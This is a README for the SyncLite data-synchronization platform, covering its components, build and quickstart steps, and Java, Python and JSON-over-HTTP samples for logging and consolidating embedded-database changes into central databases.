
Learn More: https://www.synclite.io/solutions/iot-data-connector

# SyncLite Components

```SyncLite Logger``` is a JDBC driver, enables developers to rapidly build 
	
-sync-enabled, robust, responsive, high-performance, low-latency, transactional, data intensive applications for edge/mobile/desktop platforms using their favorite embedded databases (SQLite, DuckDB, Apache Derby, H2, HyperSQL)
  	
-large scale data streaming solutions for last mile data integrations into a wide range of industry leading databases, while offering ability to perform real-time analytics using the native embedded databases over streaming data, at the producer end of the pipelines.

```SyncLite DB``` is a sync-enabled, single-node database server that wraps popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL. Unlike the embeddable SyncLite Logger library for Java and Python applications, SyncLite DB acts as a standalone server, allowing your edge or desktop applicationsâ€”regardless of the programming languageâ€”to connect and send SQL requests (wrapped in JSON format) over HTTP. 

```SyncLite Client``` is a command line tool to operate SyncLite devices, to execute SQL queries and workloads.

```SyncLite DBReader``` enables data teams and data engineers to configure and orchestrate many-to-many, highly scalable, incremental/log-based database ETL/replication/migration jobs across a diverse array of databases, data warehouses and data lakes.

```SyncLite QReader``` enables developers to integrate IoT data published to message queue brokers, into a diverse array of databases, data warehouses and data lakes, enabling real-time analytics and AI use cases at all three levels: edge, fog and cloud.

```SyncLite Consolidator``` is the centralized application to all the reader/producer tools mentioned above, which receives and consolidates the incoming data and log files in real-time into one or more databases, data warehouses and data lakes of userâ€™s choice. SyncLite Consolidator also offers additional features: table/column/value filtering and mapping, data type mapping, database trigger installation, fine-tunable writes, support for multiple destinations and more.

```SyncLite JobMonitor``` enables managing, scheduling and monitoring all SyncLite jobs created on a given host.

```SyncLite Validator``` is an E2E integration testing tool for SyncLite.

# Build SyncLite

1. If you are using a pre-built release then ignore this section. 
2. Install/Download Apache Maven(3.8.6 or above): https://maven.apache.org/download.cgi
3. If you opt to not use the deploy scripts generated in the release which download the prerequisite software : Apache Tomcat and OpenJDK, then manually install them
	
 	a. OpenJDK 11 : https://jdk.java.net/java-se-ri/11
	
 	b. Apache Tomcat 9.0.95 : https://tomcat.apache.org/download-90.cgi

5. Run following: 
	```
	git clone --recurse-submodules git@github.com:syncliteio/SyncLite.git SyncLite
	
	cd SyncLite
	
	mvn -Drevision=oss clean install
	
	```
6. Release is created under SyncLite/target

## Release Structure:

The build process creates following release structure under SyncLite\target: 
```
synclite-platform-<version>
|
|
--------lib
|       |
|       |
|        --------logger
|       |        |
|       |        |
|       |        --------java
|       |        |        |
|       |        |        |    
|       |        |        --------synclite-logger-<version>.jar   ==> SyncLite Logger JDBC driver, to be added as a depependency in your edge apps
|       |        |
|       |        |
|       |        --------synclite_logger.conf  ==> A sample configuration file for SyncLite logger.
|       |
|       |
|       --------consolidator
|       |        |
|       |        |
|       |        --------synclite-consolidator-<version>.war   ==> SyncLite Consolidator application, to be deployed on an application server such as Tomcat on a centralized host
|
|
|
|
--------sample-apps
|        |
|        |
|        --------jsp-servlet
|        |        |
|        |        |
|        |        --------web
|        |        |
|        |        |
|        |        --------src          ==> Source code of a sample Jsp Servlet app that demonstrates usage of synclite-logger
|        |        |
|        |        |
|        |        --------target        
|        |        |
|        |        |
|        |        --------synclite-sample-app-<version>.war
|        |        
|        |
|        --------java
|        |        |
|        |        |
|        |        --------*.java    => Java source files demonstrating SyncLite logger usage.
|        |        |
|        |        |
|        |        --------README
|        |
|        |
|        |
|        |
|        --------python
|                |
|                |
|                --------*.py    => Python source files demonstrating SyncLite logger usage.
|                |
|                |
|                --------README
|
|
|
|
--------bin
|        |
|        |
|        --------deploy.bat/deploy.sh    ==> Deployment script for deploying SyncLite consolidator and sample application from the lib directory
|        |                    
|        |                        
|        --------start.bat/start.sh    ==> Launch script to start tomcat and the deployed SyncLite applications.
|        |             
|        |           
|        --------docker-deploy.sh/docker-start.sh   ==> Deployment and launch scripts for running SyncLite Consolidator inside a docker container. 
|        |             
|        |           
|        --------stage
|        |        |         
|        |        |         
|        |        --------sftp    ==> Contains docker-deploy.sh,docker-start.sh, docker-stop.sh scripts to launch SFTP server as SyncLite stage
|        |        |         
|        |        |                                   
|        |        --------minio   ==> Contains docker-deploy.sh, docker-start.sh, docker-stop.sh scripts to launch MinIO server as SyncLite stage
|        |       
|        |       
|        |       
|        --------dst
|                |
|                |                
|                --------postgresql  ==> Contains docker-deploy.sh,docker-start.sh scripts to launch PostgrSQL server as SyncLite destination DB
|                |         
|                |                                  
|                --------mysql   ==> Contains docker-deploy.sh, docker-start.shscripts to launch MySQL server as SyncLite destination DB
| 
|
|
--------tools
        |
        |
        --------synclite-client   ==> Client tool to execute SQL operations on SyncLite databases/devices.
	|
	|
        --------synclite-db    ==> A standalone database server offering sync-enabled embedded databases for edge/desktop applications. 
	|
	|
        --------synclite-dbreader    ==> Smart database ETL/Replication/Migration tool
	|
	|
	--------synclite-qreader     ==> Rapid IoT data connector tool
	|
	|
	--------synclite-job-monitor   ==> Job Monitor tool to manage, monitor and schedule SyncLite jobs.
	|
	|
        --------synclite-validator    ==> An E2E integration testing tool for SyncLite
 

```

### Quick Start - Native/Docker based

NOTE: Below instructions enable a quick start and trial of SyncLite platform. 
For production usage, it is recommended to go through installation process to install OpenJDK11 and Tomcat9 (as a service) 
on your Windows/Ubuntu host.

1. Enter bin directory.

2. (One time) Run ```deploy.bat```(WINDOWS) / ```deploy.sh``` (UBUNTU) to deploy the SyncLite consolidator and a SyncLite sample application.
   
   OR Run ```docker-deploy.sh``` (UBUNTU) to deploy a docker container for SyncLite platform.

   OR Manually deploy below war files on your tomcat server:
   - ```SyncLite\target\synclite-platform-dev\lib\consolidator\synclite-consolidator-oss.war```,
   - ```SyncLite\target\synclite-platform-dev\sample-apps\jsp-servlet\web\target\synclite-sample-app-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-dbreader-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-qreader-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-jobmonitor-oss.war```
     
   
3. Run ```start.bat```(WINDOWS) / ```start.sh```(UBUNTU) to start tomcat and the deployed SyncLite applications. (Please note the username/password for tomcat manager web console is synclite/synclite)

   OR Run ```docker-start.sh``` to run the docker container (Please check options passed to docker run command e.g. the home directory of the current user is mapped to ```/root``` inside docker to persist all the
   SyncLite storage in the native host).

   OR manually start applications from your tomcat manager console.

4. Open tomcat manager console http://localhost:8080/manager (Use synclite/synclite as the default user/password when prompted as set by the deploy script). The manager web console will show all the SyncLite applications deployed. 

5. Open http://localhost:8080/synclite-consolidator to launch SyncLite Consolidator application

6. Open http://localhost:8080/synclite-sample-app to launch SyncLite sample web application 

7. Configure and start SyncLite consolidator job in the SyncLite Consolidator application. You can follow through the ""Configure Job"" wizard reviewing all the default configuration values. Create databases/devices of any type from the deployed sample web application and execute SQL workloads on several devices at once specifying the device index range. Observe data consolidator in the SyncLite Cosolidator dashboard. You can check device specific data consolidation progress on individual device pages (from ""List Devices"" page), query destination database on the ""Analyze Data"" page. 

8. This release also comes with a CLI client for SyncLite under tools/synclite-client. You can run synclite-client.bat(WINDOWS)/synclite-client.sh (UBUNTU) to start the client tool and execute SQL operations which are not only executed/persisted on the native database but also consolidated by the SyncLite consolidator into destination DB.
   - Usage 1 : ```synclite-client.bat/synclite-client.sh ==> Will start with DB = <USER.HOME>/synclite/job1/db/test.db, DEVICE_TYPE = SQLITE, CONFIG = <USER.HOME>/synclite/db/synclite_logger.conf```
   - Usage 2 : ```synclite-client.bat/synclite-client.sh <path/to/db/file> --device-type <SQLITE|DUCKDB|DERBY|H2|HYPERSQL|STREAMING|SQLITE_APPENDER|DUCKDB_APPENDER|DERBY_APPENDER|H2_APPENDER|HYPERSQL_APPENDER> --synclite-logger-config <path/to/synclite/logger/config> --server <SyncLite DB Address>```
   - Note: If --sever switch is specified then the client connects to SyncLite DB to  execute SQL statements, else it usages embedded ```SyncLite Logger``` library to directly operate on the devices.
     
9. This release also comes with SyncLite DB server under tools/synclite-db. You can run synclite-db.bat(WINDOWS)/synclite-db.sh(UBUNTU) to start SyncLite DB server and connect to it using synclite-client to execute SQL operations which are not only executed/persisted on the specified embedded database but also consolidated by the SyncLite Consolidator onto the destination databases.
   - Usage 1 : ```synclite-db.bat/synclite-db.sh``` ==> Will start SyncLite DB with default configurations
   - Usage 2 : ```synclite-db.bat/synclite-db.sh --config <path/to/synclite-db/config>```
          
10. Use ```stop.bat``` (Windows) / ```stop.sh```(LINUX) to stop SyncLite consolidator job (if running) and tomcat.
   OR RUN docker-stop.sh to stop the docker container.

11. Refer ```sample_apps/java``` and ```samples_apps/python``` and use any of them as a starting point to build your own application.

12. You can install/use a database of your choice and  perform data consolidation to it (instead of the default SQLite destination): PostgreSQL, MySQL, MongoDB, SQLite, DuckDB.

13. This release also packages docker scripts to setup PostgreSQL and MySQL to serve as SyncLite destinations.
    - ```bin/dst/postgresql``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
    - ```bin/dst/mysql``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker.stop.sh```

14. You can deploy your applications on remote hosts/devices and share the local-stage-directory of your respective SyncLite applications with SyncLite Consolidator host via one of the following file staging storages: 
    - SFTP
    - Amazon S3
    - MinIO Object Storage Server
    - Apache Kafka
    - Microsoft OneDrive
    - Google Drive
    - NFS Sharing
    - Local Network Sharing
      
Please check documentation for setting up these staging storages for SyncLite : https://www.synclite.io/resources/documentation
 
15. This release also packages docker scripts to setup SFTP and MinIO servers to serve as SyncLite stage.
    - ```bin/stage/sftp```  contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
    - ```bin/stage/minio``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
      NOTE: These scripts contain default configurations. You must change usernames, passwords and setup any additional security mechanisms on top of these basic setups. 

16. The SyncLite docker scripts ```bin/docker-deploy.sh```, ```bin/docker-start.sh```, ```bin/docker-stop.sh``` contain two variables at the top to choose a stage and destination:
    - STAGE : Set it to SFTP or MINIO.
    - DST : Set it to POSTGRESQL or MYSQL.

      Once you set the STAGE and DST to appropriate values e.g. SFTP and POSTGRESQL, the ```docker-deploy.sh``` and ```docker-start.sh``` scripts will bring up docker containers for SyncLite consolidator, SFTP
      server and PostgreSQL server and you will be all set to configure and start a SyncLite consoldiator job be able to consolidate data into PostgreSQL server received from remote SyncLite applications
      configured to connect to the SFTP stage. 

17. After a successful trial, if you need to perform another trial, stop the docker containers, and delete contents under ```/home/synclite``` to start a fresh trial of a different scenario etc.

18. Open http://localhost:8080/synclite-dbreader (and open http://localhost:8080/synclite-consolidator) to setup database ETL/Replication/Migration pipelines.

19. Open http://localhost:8080/synclite-qreader (and open http://localhost:8080/synclite-consolidator) to setup rapid IoT pipelines.

20. Open http://localhost:8080/synclite-job-monitor to manage, monitor and schedule various SyncLite jobs.
    
Refer documentation at https://www.synclite.io/resources/documentation for more details.

NOTE : For production usage, it is recommended to install OpenJDK11 and Tomcat as a service (or any other application server of your choice) and deploy SyncLite consolidator web archive release, Please refer our documentation at www.synclite.io for detailed installation steps for Windows and Ubuntu.


# Using SyncLite Logger

Add ```synclite-logger-<version>.jar``` file created as part of the above build as a dependency in your application.

## Configuration File

Refer ```src/main/resources/synclite_logger.conf``` file for all available configuration options for SyncLite Logger. Refer ""SyncLite Logger Configuration"" section in the documentation at https://www.synclite.io/resources/documentation for more details about all configuration options. 

## Application Code Samples (SQL API)

Refer below code samples to build applications using SyncLite Logger. 

### Transactional Devices : 

Transactional devices (SQLite, DuckDB, Apache Derby, H2, HyperSQL) support all database operations and perform transactional logging of all the DDL and DML operations performed by the application. These enable  developers to build use cases such as building data-intensive sync-ready applications for edge, edge + cloud GenAI search and RAG applications, native SQL (hot) hot data stores, SQL application caches, edge enablement of cloud databases and more.

#### Java
```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;


public class TestTransactionalDevice {
	
	public static Path syncLiteDBPath;
	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.SQLite"");
		//
		//////////////////////////////////////////////////////
		//For other types of transactional devices : 
		//DuckDB : Class.forName(""io.synclite.logger.DuckDB"");
		//Apache Derby : Class.forName(""io.synclite.logger.Derby"");
		//H2 : Class.forName(""io.synclite.logger.H2"");
		//HyperSQL : Class.forName(""io.synclite.logger.HyperSQL"");
		//////////////////////////////////////////////////////
		//

		Path dbPath = syncLiteDBPath.resolve(""test_tran.db"");
		SQLite.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//
		//////////////////////////////////////////////////////
		//For other types of transactional devices : 
		//DuckDB : DuckDB.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//Apache Derby : Derby.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//H2 : H2.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//HyperSQL : HyperSQL.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//////////////////////////////////////////////////////
		//
	}	
	
	public void myAppBusinessLogic() throws SQLException {
		//
		//Some application business logic
		//
		//Perform some database operations		
		try (Connection conn = DriverManager.getConnection(""jdbc:synclite_sqlite:"" + syncLiteDBPath.resolve(""test_sqlite.db""))) {
			//
		        //////////////////////////////////////////////////////////////////
			//For other types of transactional devices use following connection strings :
			//For DuckDB : jdbc:synclite_duckdb:<db_path>
			//For Apache Derby : jdbc:synclite_derby:<db_path>
			//For H2 : jdbc:synclite_h2:<db_path>
			//For HyperSQL : jdbc:synclite_hsqldb:<db_path>
			///////////////////////////////////////////////////////////////////
			//
			try (Statement stmt = conn.createStatement()) { 
				//Example of executing a DDL : CREATE TABLE. 
				//You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
				
				//Example of performing INSERT
				stmt.execute(""INSERT INTO feedback VALUES(3, 'Good product')"");				
			}
			
			//Example of setting Auto commit OFF to implement transactional semantics
			conn.setAutoCommit(false);
			try (Statement stmt = conn.createStatement()) { 
				//Example of performing basic DML operations INSERT/UPDATE/DELETE
				stmt.execute(""UPDATE feedback SET comment = 'Better product' WHERE rating = 3"");
				stmt.execute(""INSERT INTO feedback VALUES (1, 'Poor product')"");
				stmt.execute(""DELETE FROM feedback WHERE rating = 1"");
			}
			conn.commit();
			conn.setAutoCommit(true);
			
			//Example of Prepared Statement functionality for bulk insert.			
			try(PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();
				
				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();
				
				pstmt.executeBatch();			
			}
		}
		//Close SyncLite database/device cleanly.
		SQLite.closeDevice(Path.of(""test_sqlite.db""));
		//
		///////////////////////////////////////////////////////
		//For other types of transactional devices :
		//DuckDB : DuckDB.closeDevice
		//Apache Derby : Derby.closeDevice
		//H2 : H2.closeDevice
		//HyperSQL : HyperSQL.closeDevice
		//////////////////////////////////////////////////////
		//
		//You can also close all open databases in a single SQL : CLOSE ALL DATABASES
	}	
	
	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestTransactionalDevice testApp = new TestTransactionalDevice();
		testApp.myAppBusinessLogic();
	}
}

```
#### Python   

```
import jaydebeapi

props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""tran1""
}
conn = jaydebeapi.connect(""io.synclite.logger.SQLite"",
                           ""jdbc:synclite_duckdb:c:\\synclite\\python\\data\\test_sqlite.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)
#//
#////////////////////////////////////////////////////////////////
#For other types of transactional devices use following are the class names and connection strings :
#For DuckDB - Class : io.synclite.logger.DuckDB, Connection String : jdbc:synclite_duckdb:<db_path>
#For Apache Derby - Class : io.synclite.logger.Derby, Connection String : jdbc:synclite_derby:<db_path>
#For H2 - Class : io.synclite.logger.H2, Connection String : jdbc:synclite_h2:<db_path>
#For HyperSQL - Class : io.synclite.logger.HyperSQL, Connection String : jdbc:synclite_hsqldb:<db_path>
#/////////////////////////////////////////////////////////////////
#//

curs = conn.cursor()

#Example of executing a DDL : CEATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of performing basic DML operations INSERT/UPDATE/DELETE
curs.execute(""insert into feedback values (3, 'Good product')"")

#Example of setting Auto commit OFF to implement transactional semantics
conn.jconn.setAutoCommit(False)
curs.execute(""update feedback set comment = 'Better product' where rating = 3"")
curs.execute(""insert into feedback values (1, 'Poor product')"")
curs.execute(""delete from feedback where rating = 1"")
conn.commit()
conn.jconn.setAutoCommit(True)


#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\test_sqlite.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

### Appender Devices :

Appender devices (SQLiteAppender, DuckDBAppender, DerbyAppender, H2Appender, HyperSQLAppender) support all DDL operations and Prepared Statement based INSERT operations, are highly optimized for high speed concurrent batched data ingestion, performing logging of ingested data. Unlike transactional devices, appender devices only allow INSERT DML operations (UPDATE and DELETE are not allowed). Appender devices enable developers to build high volume streaming applications enabled with last mile data integration from thousands of edge points into centralized database destinations as well as in-app analytics by enabling fast read access to ingested data from the underlying local embedded databases storing the ingested/streamed data.

#### Java

```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;

public class TestAppenderDevice {
	public static Path syncLiteDBPath;

	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.SQLiteAppender"");
		//
		//////////////////////////////////////////////////////
		//For other types of appender devices : 
		//DuckDB : Class.forName(""io.synclite.logger.DuckDBAppender"");
		//Apache Derby : Class.forName(""io.synclite.logger.DerbyAppender"");
		//H2 : Class.forName(""io.synclite.logger.H2Appender"");
		//HyperSQL : Class.forName(""io.synclite.logger.HyperSQLAppender"");
		//////////////////////////////////////////////////////
		//
		Path dbPath = syncLiteDBPath.resolve(""test_appender.db"");
		SQLiteAppender.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
	}

	public void myAppBusinessLogic() throws SQLException {
		//
		// Some application business logic
		//
		// Perform some database operations
		try (Connection conn = DriverManager.getConnection(""jdbc:synclite_sqlite_appender:"" + syncLiteDBPath.resolve(""test_appender.db""))) {
			//
		        //////////////////////////////////////////////////////////////////
			//For other types of appender devices use following connection strings :
			//For DuckDBAppender : jdbc:synclite_duckdb_appender:<db_path>
			//For DerbyAppender : jdbc:synclite_derby_appender:<db_path>
			//For H2Appender : jdbc:synclite_h2_appender:<db_path>
			//For HyperSQLAppender : jdbc:synclite_hsqldb_appender:<db_path>
			///////////////////////////////////////////////////////////////////
			//
			try (Statement stmt = conn.createStatement()) {
				// Example of executing a DDL : CREATE TABLE.
				// You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
			}

			//
			// Example of Prepared Statement functionality for bulk insert.
			// Note that Appender Devices allows all DDL operations, INSERT INTO DML operations (UPDATES and DELETES are not allowed) and SELECT queries.
			//
			try (PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();

				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();

				pstmt.executeBatch();
			}
		}
		// Close SyncLite database/device cleanly.
		SQLiteAppender.closeDevice(Path.of(""test_appender.db""));
		//
		///////////////////////////////////////////////////////
		//For other types of appender devices :
		//DuckDBAppender : DuckDBAppender.closeDevice
		//DerbyAppender : DerbyAppender.closeDevice
		//H2Appender : H2Appender.closeDevice
		//HyperSQLAppender : HyperSQLAppender.closeDevice
		//////////////////////////////////////////////////////
		//
		// You can also close all open databases/devices in a single SQL : CLOSE ALL
		// DATABASES
	}

	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestAppenderDevice testApp = new TestAppenderDevice();
		testApp.myAppBusinessLogic();
	}

}
```

#### Python

```
import jaydebeapi
props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""appender1""
}
conn = jaydebeapi.connect(""io.synclite.logger.SQLiteAppender"",
                           ""jdbc:synclite_sqlite_appender:c:\\synclite\\python\\data\\test_appender.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)
#//
#////////////////////////////////////////////////////////////////
#For other types of appender devices use following are the class names and connection strings :
#For DuckDBAppender - Class : io.synclite.logger.DuckDBAppender, Connection String : jdbc:synclite_duckdb_appender:<db_path>
#For DerbyAppender - Class : io.synclite.logger.DerbyAppender, Connection String : jdbc:synclite_derby_appender:<db_path>
#For H2Appender - Class : io.synclite.logger.H2Appender, Connection String : jdbc:synclite_h2_appender:<db_path>
#For HyperSQLAppender - Class : io.synclite.logger.HyperSQLAppender, Connection String : jdbc:synclite_hsqldb_appender:<db_path>
#/////////////////////////////////////////////////////////////////
#//

curs = conn.cursor()

#Example of executing a DDL : CREATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\test_appender.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

### Streaming Device : 
Streaming device allows all DDL operations (as supported by SQLite) and Prepared Statement based INSERT operations (UPDATE and DELETE are not allowed) to allow high speed concurrent batched data ingestion, performing logging and streaming of the ingested data. Streaming device enable developers to build high volume data streaming applications enabled with last mile data integration from thousands of edge applications into one or more centralized databases/data warehouses/data lakes.

#### Java

```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;

public class TestStreamingDevice {
	public static Path syncLiteDBPath;

	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.Streaming"");
		Path dbPath = syncLiteDBPath.resolve(""t_str.db"");
		Streaming.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
	}

	public void myAppBusinessLogic() throws SQLException {
		//
		// Some application business logic
		//
		// Perform some database operations
		try (Connection conn = DriverManager
				.getConnection(""jdbc:synclite_streaming:"" + syncLiteDBPath.resolve(""t_str.db""))) {
			try (Statement stmt = conn.createStatement()) {
				// Example of executing a DDL : CREATE TABLE.
				// You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
			}

			// Example of Prepared Statement functionality for bulk insert.
			try (PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();

				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();

				pstmt.executeBatch();
			}
		}
		// Close SyncLite database/device cleanly.
		Streaming.closeDevice(Path.of(""t_str.db""));
		// You can also close all open databases/devices in a single SQL : CLOSE ALL
		// DATABASES
	}

	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestStreamingDevice testApp = new TestStreamingDevice();
		testApp.myAppBusinessLogic();
	}
}
```
#### Python

```
import jaydebeapi
props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""streaming1""
}
conn = jaydebeapi.connect(""io.synclite.logger.Streaming"",
                           ""jdbc:synclite_streaming:c:\\synclite\\python\\data\\t_str.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)

curs = conn.cursor()

#Example of executing a DDL : CEATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\t_str.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

## Application Code Samples (Kafka API)

```
package testApp;

import io.synclite.logger.*;

public class TestKafkaProducer {

	public static void main(String[] args) throws Exception {

		Properties props = new Properties();
	    
		//
		//Set properties to use a staging storage of your choice e.g. S3, MinIO, SFTP etc. 
		//where SyncLite logger will ship log files continuously for consumption by SyncLite consolidator
		//
		
        	Producer<String, String> producer = new io.synclite.logger.KafkaProducer(props);

		ProducerRecord<String, String> record = new ProducerRecord<>(""test"", ""key"", ""value"");
        
		//
		//You can use same or different KafkaProducer objects to ingest data concurrently over multiple theads.
		//
        	producer.send(record);
		
		produer.close();

	}
```

# Launching and using SyncLite DB

```SyncLite DB``` is a sync-enabled, single-node database server that wraps popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL. Unlike the embeddable ```SyncLite Logger``` library for Java and Python applications, ```SyncLite DB``` acts as a standalone server, allowing your edge or desktop applicationsâ€”regardless of the programming languageâ€”to connect and send/post SQL requests (wrapped in JSON format) via a REST API. This makes it an ideal solution for seamless, real-time data synchronization in diverse environments.

1. Go to the directory ```synclite-platform-<version>\tools\synclite-db```
2. Check the configurations in synclite-db.conf and adjust them as per your needs.
3. Run ```synclite-db.bat --config synclite-db.conf``` ( OR ```synclite-db.sh --config synclite-db.conf``` on linux). This starts the SyncLite DB server listening at the specified address.
4. An application in your favoirite programming language can establish a connection with the SyncLite DB server at the specified address and send requests in JSON format as below

	- Connect and initialize a device

   	Request
	```
 	{
 		""db-type"" : ""SQLITE""
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""synclite-logger-config"" : ""C:\synclite\users\bob\synclite\job1\synclite_logger.conf""
 		""sql"" : ""initialize""
 	}
  	```

 	Response from Server 
 	```
  	{
  		""result""  : true	
 		""message"" : ""Database initialized successfully""
 	}
  	```
  
	- Send a sql command to create a table

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""CREATE TABLE IF NOT EXISTS(a INT, b INT)""
 	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Update executed successfully, rows affected: 0""
   	}
  	```
  
	- Send a request to perform a batched insert in the created table

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""INSERT INTO t1(a,b) VALUES(?, ?)""
 		""arguments"" : [[1, ""one""], [2, ""two""]]
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Batch executed successfully, rows affected: 2""
   	}
  	```

	- Send a request to begin a transaction on database

 	Request
	 ```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""begin""
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Transaction started successfully""
  		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
   	}
  	```
	
	- Send a request to execute a sql inside started transaction

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""INSERT INTO t1(a,b) VALUES(?, ?)""
		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
 		""arguments"" : [[3, ""three""], [4, ""four""]]
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Batch executed successfully, rows affected: 2""
   	}
  	```

	- Send a request to commit a transaction

	Request	
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
  		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
 		""sql"" : ""commit""
 	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Transaction committed successfully""
   	}
  	```

	- Send a request to close database   	
 	Request

	 ```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""close""
   	}
 	```
	
 	Response from Server 
 	```
  	{
  		""result"" : ""true""
		""message"" : ""Database closed successfully""
   	}
  	```
 
5. SyncLite DB (internally leveraging SyncLite Logger), creates a device stage directory at configured stage path with sql logs created for each device. These device stage directories are continuously synchronized with SyncLite consolidator for consolidating them into final destination databases.
   
6. Several such hosts, each running SyncLite DB, each of them creating several SyncLite databases/devices (i.e. embedded databases), can synchornize these embedded databases in real-time with a centralized SyncLite consolidator that aggregates the incoming data and changes, in real-time, into configured destination databases.

     
